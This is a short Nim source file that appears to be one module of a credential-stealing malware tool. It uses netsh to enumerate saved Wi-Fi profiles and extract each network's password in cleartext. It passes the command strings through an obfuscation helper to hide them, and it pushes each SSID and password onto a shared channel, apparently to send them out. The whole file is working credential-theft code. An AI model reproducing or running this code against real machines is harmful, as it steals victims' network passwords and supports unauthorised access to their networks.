## TODO: test on multiple environments

from strutils import split
from strutils import contains

import ../functions/runCmd

from ../channels import mainChannel

import ../functions/hideString

proc getWifiPasswords(): void =
  let netshOutout1: string = runCmd d e"netsh wlan show profile"

  for line in netshOutout1.split("\n"):
    let split: seq[string] = line.split(": ")

    if split.len == 2:
      let SSID: string = "\"" & split[1] & "\""
      let netshOutout2: string = runCmd(
        d(e("netsh wlan show profile ")) & SSID & d(e(" key=clear"))
      )

      for line in netshOutout2.split("\n"):
        if line.contains(d e"Key Content"):
          let password: string = line.split(": ")[1]
          mainChannel.send SSID & ": " & password

proc initWifiPasswordsThread*(): void {.thread.} =
  getWifiPasswords()
